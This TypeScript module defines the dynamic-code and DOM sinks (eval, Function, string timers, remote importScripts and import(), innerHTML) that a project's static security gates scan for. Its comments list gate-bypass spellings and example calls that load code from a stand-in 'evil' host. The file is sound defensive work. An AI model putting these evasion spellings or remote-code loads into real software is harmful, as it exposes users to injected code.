// SPDX-License-Identifier: AGPL-3.0-or-later
//
// The canonical DYNAMIC-CODE-SINK definitions, shared by every static gate that
// must reject runtime code evaluation:
//
//   • `lint:security`                  — the repository-wide source scan
//   • `check:sw`                       — the built service worker
//   • `check:update-channel`           — the private-mode update path's SW
//   • `check:private-bundle-transparency` — the private-mode bundle
//
// Owned HERE rather than copied into each gate because the four copies had
// already DIVERGED into a shared hole: every one of them pinned only
// `new Function(…)`, so the bare `Function(…)` call — which constructs the
// exact same function object, and is the form a minifier or an obfuscated
// payload naturally emits — passed all four gates untouched. A single
// definition means a sink closed here is closed everywhere at once.
//
// HOW THE SINKS ARE DETECTED — not by regex. Review of PR #169 found a new
// bypass SPELLING on six consecutive rounds (`Function['call'](…)`,
// `Reflect['apply'](…)`, `globalThis.Function?.call(…)`, computed timer
// methods, …) because "an expression that evaluates to a sink and is then
// INVOKED" is a structural property no regex can express. Detection therefore
// lives in `js-sink-analyzer.ts`, which tokenises and walks the access chain;
// this module only declares WHICH names are sinks and which argument makes an
// invocation dangerous.
//
// Nothing here is a pattern over source text any more.  A `javascript:` URL is
// string CONTENT, so it is read from the cooked value of a string literal; the
// member-named DOM sinks are walked structurally; and the one remaining textual
// need — blanking comments for the update-channel MARKER checks — is answered
// by the parser rather than by a state machine.

import type { MemberSinkSpec, SinkSpec, Source } from './js-sink-analyzer.js';
import {
  findSinkInvocations,
  findSinkInvocationsIn,
  isNonSameOriginUrl,
  isStringLiteral,
} from './js-sink-analyzer.js';
import { blankComments, withParsedSources } from './ts-source.js';

export type { MemberSinkSpec, SinkSpec, Source } from './js-sink-analyzer.js';
export {
  findJavascriptUrlsIn,
  findMemberSinkUses,
  findMemberSinkUsesIn,
  findSinkInvocations,
  findSinkInvocationsIn,
  isNonSameOriginUrl,
  isStringLiteral,
} from './js-sink-analyzer.js';

/**
 * The dynamic-code sinks. `eval` and the `Function` constructor evaluate
 * whatever they are handed, so ANY invocation counts; the timers compile their
 * argument only when it is a STRING, so `setTimeout(fn, 0)` stays clean.
 *
 * There is no longer a separate "strict" variant for built artifacts. That
 * existed to also match `x.eval(`, on the theory a bundler might rewrite the
 * reference — but a minifier emits `eval(` for a global eval call, so it caught
 * nothing real while matching prose such as "no remote code, no eval
 * (WS-C.2.1d)", which is precisely the false positive it produced against the
 * shipped service worker. The analyzer separates a global sink from somebody
 * else's property structurally, so the heuristic is no longer needed.
 */
export const DYNAMIC_CODE_SINKS: readonly SinkSpec[] = [
  { name: 'eval', label: 'eval()' },
  { name: 'Function', label: 'Function() constructor (equivalent to eval)' },
  {
    name: 'setTimeout',
    label: 'setTimeout/setInterval with a string body (implicit eval)',
    codeArgument: isStringLiteral,
  },
  {
    name: 'setInterval',
    label: 'setTimeout/setInterval with a string body (implicit eval)',
    codeArgument: isStringLiteral,
  },
];

/**
 * `importScripts` loading anything that is NOT same-origin — foreign CODE.
 *
 * VARIADIC: it loads every URL it is handed, so a same-origin first argument
 * does not make the call safe — `importScripts('/local.js', 'https://evil/x.js')`
 * fetches remote code. Each argument is judged.
 */
export const REMOTE_IMPORT_SCRIPTS_SINK: SinkSpec = {
  name: 'importScripts',
  label: 'external importScripts (remote code)',
  codeArgument: isNonSameOriginUrl,
  variadic: true,
};

/**
 * A dynamic `import()` of a non-same-origin URL — remote code, loaded and run.
 *
 * `import` lexes as an identifier, so the analyzer walks it like any other
 * callee and the specifier gets the same constant folding every other argument
 * does: `import('ht' + 'tps://evil/x.js')` is the same module load as the
 * unsplit literal, and a pattern anchored on the scheme could not see it.
 * A STATIC `import … from '…'` is not a CALL, so it never matches.
 */
export const REMOTE_DYNAMIC_IMPORT_SINK: SinkSpec = {
  name: 'import',
  label: 'dynamic import() of a remote URL',
  codeArgument: isNonSameOriginUrl,
};

/**
 * The sink set for a SOURCE-tree scan and for a BUILT-artifact scan. They are
 * now IDENTICAL (see the note on the strict `eval` variant above) and kept as
 * two names only so each gate reads clearly at its own call site.
 */
export const SOURCE_CODE_SINKS: readonly SinkSpec[] = DYNAMIC_CODE_SINKS;
export const BUILT_CODE_SINKS: readonly SinkSpec[] = DYNAMIC_CODE_SINKS;

/** A finding: the sink's human label and the 1-based line it starts on. */
export interface SinkMatch {
  readonly label: string;
  readonly line: number;
}

/**
 * Find dynamic-code sink INVOCATIONS in `source`.
 *
 * A thin wrapper over the analyzer so the gates share one entry point.
 * Comments can never produce a finding — the tokeniser discards them — so
 * doctrine may be discussed in prose, and no comment-stripping pass is
 * load-bearing for detection.
 */
export function findDynamicCodeSinks(
  source: string,
  sinks: readonly SinkSpec[] = DYNAMIC_CODE_SINKS,
): SinkMatch[] {
  return findSinkInvocations(source, sinks).map(({ label, line }) => ({ label, line }));
}

/**
 * The same scan over MANY sources, sharing one parse.
 *
 * A gate that walks a directory tree must use this: parsing is batched per
 * project, and opening one project per file turned a repository-wide scan from
 * seconds into minutes.
 */
export function findDynamicCodeSinksIn(
  sources: readonly Source[],
  sinks: readonly SinkSpec[] = DYNAMIC_CODE_SINKS,
): Map<string, SinkMatch[]> {
  const found = new Map<string, SinkMatch[]>();
  for (const [path, sinksFound] of findSinkInvocationsIn(sources, sinks)) {
    found.set(
      path,
      sinksFound.map(({ label, line }) => ({ label, line })),
    );
  }
  return found;
}

/**
 * The DOM sinks named by a PROPERTY. Walked structurally, not matched: a
 * pattern anchored on `.innerHTML` reads only the dotted spelling, so
 * `node['innerHTML'] = payload` and `document['write'](payload)` reached the
 * same sinks past a merge-blocking XSS gate.
 */
export const DOM_MEMBER_SINKS: readonly MemberSinkSpec[] = [
  { property: 'innerHTML', form: 'assign', label: 'Direct innerHTML assignment (use DOMPurify)' },
  { property: 'outerHTML', form: 'assign', label: 'Direct outerHTML assignment' },
  { receiver: 'document', property: 'write', form: 'call', label: 'document.write() call' },
  { receiver: 'document', property: 'writeln', form: 'call', label: 'document.writeln() call' },
];

// ---------------------------------------------------------------------------
// Textual sinks. A `javascript:` URL is string CONTENT with no call chain, so
// a pattern remains the right tool for it.
// ---------------------------------------------------------------------------

/**
 * Blank COMMENTS so doctrine may be discussed in prose while real wiring still
 * satisfies a marker check.
 *
 * Length- and newline-preserving, so a match index still maps to its line.
 *
 * This was a 120-line hand-written state machine that scanned the file TWICE,
 * under both readings of `/`, because — its own comment — the case is
 * "ambiguous without a parser".  It is; the parser settles it, and a node's
 * leading trivia is exactly where a comment can be.
 */
export function stripComments(source: string): string {
  return withParsedSources([{ path: 'strip.ts', content: source }], (parsed) => {
    const root = parsed[0]?.root;
    return root === undefined ? source : blankComments(source, root);
  });
}
